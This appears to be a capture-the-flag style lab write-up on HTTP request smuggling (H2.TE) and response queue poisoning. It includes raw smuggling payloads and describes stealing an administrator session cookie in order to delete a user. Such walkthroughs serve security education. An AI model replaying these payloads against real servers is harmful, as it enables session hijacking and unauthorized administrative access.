
# Response queue poisoning via H2.TE request smuggling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 15 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

Searching generates a POST request:

It looks it is vulnerable to HTTP request smuggling of type CL.TE, and we can read requests with this payload:

```
POST / HTTP/2
...
Content-Type: x-www-form-urlencoded
Content-Length: 156
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a32000c046da999825cd4a900ba008a.web-security-academy.net
Content-Type: x-www-form-urlencoded
Content-Length: 100

search=
```

We will smuggle a second whole request, so we will send 2 complete POST requests to /404:

```
POST /404 HTTP/2
...
Content-Type: x-www-form-urlencoded
Content-Length: 149
Transfer-Encoding: chunked

0

POST /404 HTTP/1.1
Host: 0a32000c046da999825cd4a900ba008a.web-security-academy.net
Content-Type: x-www-form-urlencoded
Content-Length: 1

a
```

However, if the next request we send is a POST to “/”, it will return the response to the second POST request to /404, instead of the home page:

And if the third request is to “/404”, it will respond with the response to the last request to “/”, instead of “Not found”:

I sent some more requests and got a redirection code 302 to /my-account setting the cookie value to “XOhkm2PtWb1ciwgfJKMwDHcIGxFjvti1”. It seems this is the administrator cookie and we can delete the user with it:
